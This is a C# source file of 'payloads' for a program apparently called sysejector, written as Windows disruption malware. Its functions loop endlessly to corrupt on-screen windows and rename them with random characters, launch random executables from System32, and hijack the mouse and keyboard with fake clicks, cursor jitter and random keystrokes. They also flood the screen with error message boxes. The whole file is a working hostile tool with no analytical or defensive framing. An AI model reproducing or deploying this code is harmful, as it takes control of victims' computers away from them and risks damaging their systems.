using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static sysejector.dllimports;
using static sysejector.functions;

namespace sysejector
{
    internal class payloads
    {
        public static bool EnumWindowProc(IntPtr hwnd, bool lParam)
        {
            RECT rect;
            IntPtr hdc = GetDC(hwnd);
            GetWindowRect(hwnd, out rect);
            int cxWindow = rect.Right - rect.Left;
            int cyWindow = rect.Bottom - rect.Top;

            BitBlt(hdc, r.Next(-4, 4), r.Next(-4, 4), cxWindow, cyWindow, hdc, r.Next(-4, 4), r.Next(-4, 4),
                (r.Next() % 2 != 0) ? TernaryRasterOperations.SRCAND : TernaryRasterOperations.SRCPAINT);
            SetWindowText(hwnd, generateUnicode(r.Next(1000)));
            ReleaseDC(IntPtr.Zero, hdc);
            return true;
        }

        public static void refreshes()
        {
            while (true)
            {
                if (r.Next(5000) == 0)
                {
                    RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
                }
                Thread.Sleep(r.Next(2000));
            }
        }
        
        public static void msgboxDelegate()
        {
            MessageBox.Show(generateUnicode(r.Next(500)), generateUnicode(r.Next(500)), MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        public static void openFiles()
        {
            while (true)
            {
                try
                {
                    string[] files = Directory.GetFiles("C:\\Windows\\System32");
                    Process.Start(files[r.Next(files.Length)]);
                    Thread.Sleep(r.Next(10000, 15000));
                }
                catch { }
            }
        }

        public static void inputMess()
        {
            while (true)
            {
                if (r.Next(2000) == 0)
                {
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
                }
                else
                {
                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, UIntPtr.Zero);
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, UIntPtr.Zero);
                }
                Thread.Sleep(r.Next(10000, 15000));
            }
        }

        public static void cursor()
        {
            while (true)
            {
                POINT point;
                GetCursorPos(out point);
                SetCursorPos(point.X + (r.Next() % 3 - 1), point.Y + (r.Next() % 3 - 1));
                Thread.Sleep(10);
            }
        }

        public static void typing()
        {
            while (true)
            {
                SendKeys.SendWait(generateLetters(1));
                Thread.Sleep(r.Next(5000, 10000));
            }
        }

        public static void window()
        {
            while (true)
            {
                EnumChildWindows(GetDesktopWindow(), EnumWindowProc, IntPtr.Zero);
                Thread.Sleep(r.Next(10000, 15000));
            }
        }

        public static void msgbox()
        {
            while (true)
            {
                Thread msgDelegate = new Thread(msgboxDelegate);
                msgDelegate.Start();
                Thread.Sleep(r.Next(7000));
            }
        }
    }
}